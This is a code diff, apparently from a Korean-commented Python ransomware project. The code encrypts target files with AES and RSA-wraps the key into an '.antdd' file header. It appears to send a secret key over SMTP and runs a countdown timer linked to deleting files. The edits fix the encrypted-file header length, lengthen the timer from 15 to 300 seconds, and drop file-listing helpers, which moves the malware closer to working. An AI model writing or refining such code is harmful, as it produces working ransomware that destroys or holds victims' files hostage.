@@ -44,8 +44,8 @@ def enc(key, cipher, in_filename, out_filename=None):
             pass
 
         with open(out_filename, 'ab') as outfile:  # 이어쓰기 모드
-            # RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
-            outfile.write(b'0' * (64832 - len(str(size_of_data))) + str(size_of_data).encode())
+            # RSA : 길이 11 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
+            outfile.write(b'0' * (11 - len(str(size_of_data))) + str(size_of_data).encode())
 
             # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
             outfile.write(ciphertext)
@@ -64,11 +64,11 @@ def dec(cipher, in_filename, out_filename=None):
         e_data = infile.read()
 
         # RSA : 파일의 크기와 암호화된 AES 키 추출
-        size_of_data = int(e_data[:64832].lstrip(b'0').decode())
-        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
+        size_of_data = int(e_data[:11].lstrip(b'0').decode())
+        aes_key_enc = e_data[11:139]  # 암호화된 aes 키 (128바이트)
 
         # RSA : 암호화된 진짜 원본 데이터 추출
-        e_data = e_data[64960:]
+        e_data = e_data[139:]
 
         # RSA : 추출한 AES 키 복호화
         aes_key_dec = cipher.decrypt(aes_key_enc)
@@ -105,7 +105,6 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.listWindow.destroy()
 
     startTimer(gui, os.getcwd())  # @@
-
 
 class AnimatedGIF(Label, object):
     def __init__(self, master, path, forever=True):
@@ -334,7 +333,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 15, antdd_filelist)
+    clock(gui, 300, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -371,26 +370,6 @@ class RealMain:
 
         self.myGui = MyTk(parent=self)  # 자기자신에 대한 레퍼런스를 가지는 gui 객체 생성
 
-    def encListFiles(self, path):
-        filelist = []
-        for name in os.listdir(path):
-            if os.path.isfile(os.path.join(path, name)):
-                for i in extlist:
-                    if name.endswith(i):
-                        filelist.append(name)
-                    else:
-                        continue
-
-        return filelist
-
-    def decListFiles(self, path):
-        filelist = []
-        for name in os.listdir(path):
-            if name.endswith(".antdd"):
-                filelist.append(name)
-            else:
-                continue
-        return filelist
 
     def run(self):
         # smtp 로그인 후 비밀키 전송
@@ -452,7 +431,6 @@ class RealMain:
                     server.quit()
 
                     ##! 복호화 및 타겟파일 삭제
-                    #dec_targetlist = self.decListFiles(os.getcwd())  # @@
                     dec_targetlist = []
                     enc_search_dir(dec_targetlist, os.getcwd())
                     for dec_target in dec_targetlist:
